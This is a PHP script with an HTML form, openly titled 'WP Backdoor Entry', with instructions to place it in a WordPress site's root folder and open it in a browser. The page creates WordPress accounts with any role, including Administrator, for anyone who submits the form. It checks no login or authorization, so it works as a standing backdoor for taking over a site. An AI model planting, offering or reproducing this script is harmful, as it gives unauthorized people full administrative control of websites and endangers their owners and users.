<?php
/*

  Script Name: WP Backdoor Entry
  
  Description: A script to create a new user with specified role.
  
  Usage: Copy this file into your WordPress root folder and execute the script via the browser.

  */


$wp_folder  = '';
$username   = '';
$email      = '';
$password   = '';
$role       = '';

if (isset($_POST['name'])) {
  $username  = htmlentities($_POST['name']);
}
if (isset($_POST['email'])) {
  $email     = htmlentities($_POST['email']);
}
if (isset($_POST['password'])) {
  $password  = htmlentities($_POST['password']);
}
if (isset($_POST['role'])) {
  $role     = htmlentities($_POST['role']);
}

/** Make sure that the WordPress bootstrap has run before continuing. */
if (!empty($wp_folder)) {
  $wp_load_path = $wp_folder . '/wp-load.php';
} else {
  $wp_load_path = 'wp-load.php';
}

if (!file_exists($wp_load_path)) {
  echo "ERROR! wp-load.php does not exist!";
  echo '<br>';
  exit;
}

function vc_create_administrator($username, $password, $email, $role, $wp_load_path)
{

  include($wp_load_path);

  if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    $user = new WP_User($user_id);
    $user->set_role($role);
  } else {
    echo 'ERROR! The username or email is already exists!';
    echo '<br>';
    exit;
  }

  if (!empty($username)) {
    echo "<script>location.href='/wp-login.php';</script>";
  }
}

/**
 * Invoke the function
 */
vc_create_administrator($username, $password, $email, $role, $wp_load_path);

/**
 * Hook into WordPress action
 */
add_action('init', 'vc_create_administrator');

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WP Backdoor Entry</title>
  <style>
    * {
      padding: 0;
      margin: 0;
    }

    /* Style inputs, select elements and textareas */
    input[type=text],
    input[type=password],
    select,
    textarea {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      resize: vertical;
    }

    h1 {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      padding-bottom: 10px;
    }

    /* Style the label to display next to the inputs */
    label {
      padding: 12px 12px 12px 0;
      display: inline-block;
    }

    /* Style the submit button */
    input[type=submit] {
      background-color: #04AA6D;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      float: right;
    }

    /* Style the container */
    .container {
      border-radius: 5px;
      background-color: #f2f2f2;
      padding: 100px 50px 100px 50px;
      height: 100vh;
    }

    /* Floating column for labels: 25% width */
    .col-25 {
      float: left;
      width: 25%;
      margin-top: 6px;
    }

    /* Floating column for inputs: 75% width */
    .col-75 {
      float: left;
      width: 75%;
      margin-top: 6px;
    }

    /* Clear floats after the columns */
    .row:after {
      content: "";
      display: table;
      clear: both;
    }

    /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
    @media screen and (max-width: 600px) {

      .col-25,
      .col-75,
      input[type=submit] {
        width: 100%;
        margin-top: 0;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>WP Backdoor Entry</h1>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
      <div class="row">
        <div class="col-25">
          <label for="fname">Username</label>
        </div>
        <div class="col-75">
          <input type="text" id="fname" name="name" placeholder="Username">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Email</label>
        </div>
        <div class="col-75">
          <input type="text" id="lname" name="email" placeholder="E-Mail">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="lname">Password</label>
        </div>
        <div class="col-75">
          <input type="password" id="lname" name="password" placeholder="Password">
        </div>
      </div>
      <div class="row">
        <div class="col-25">
          <label for="country">Select a role:</label>
        </div>
        <div class="col-75">
          <select id="role" name="role">
            <option value="administrator">Administrator</option>
            <option value="subscriber">Subscriber</option>
            <option value="contributor">Contributor</option>
            <option value="author">Author</option>
            <option value="editor">Editor</option>
          </select>
        </div>
      </div>
      <br>
      <br>
      <div class="row">
        <input type="submit" value="Submit">
      </div>
    </form>
  </div>
</body>

</html>